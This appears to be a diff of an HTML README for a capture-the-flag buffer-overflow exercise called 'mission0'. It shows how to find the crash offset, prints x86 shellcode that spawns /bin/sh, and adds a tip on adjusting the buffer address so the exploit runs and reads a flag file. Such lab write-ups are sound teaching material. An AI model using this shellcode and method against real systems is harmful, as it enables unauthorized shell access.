@@ -22,14 +22,17 @@ In order to write a valid exploit it is necessary to:
   <em>./mission0 print('A'*number<=856) ""</em> and modify the number of 'A' until the min value, for which the Segmentation Fault         occurs, is obtained.<br>
   <strong>NB.</strong> the "" into the command are necessary because of the first check into the main function.</li> 
   <li>find a shell code such as the following:<br>
-  <em>\x31\xc0\xb0\x46\x31\xdb\x31\xc9\xcd\x80\xeb\x16\x5b\x31\xc0\x88\x43\x07 <br>
-  \x89\x5b\x08\x89\x43\x0c\xb0\x0b\x8d\x4b\x08\x8d\x53\x0c\xcd\x80\xe8\xe5 <br>
+  <em>\x31\xc0\xb0\x46\x31\xdb\x31\xc9\xcd\x80\xeb\x16\x5b\x31\xc0\x88\x43\x07
+  \x89\x5b\x08\x89\x43\x0c\xb0\x0b\x8d\x4b\x08\x8d\x53\x0c\xcd\x80\xe8\xe5 
   \xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68</em></li>
 </ul>
 
 Once all the elements have been found, write and execute the code into shell.c.<br>
 It retrieves the secret code written into the flag file.
 
-
+<h3>Some notes</h3>
+<ul>
+  <li>if it goes in Segmentation Fault, modify a little the buffer address. The buffer address is \xnn\xn<strong>N</strong>\xnn\xnn, it   can be modified by adding 2 or 4 to the bold char. </li>
 </ul>
+
 
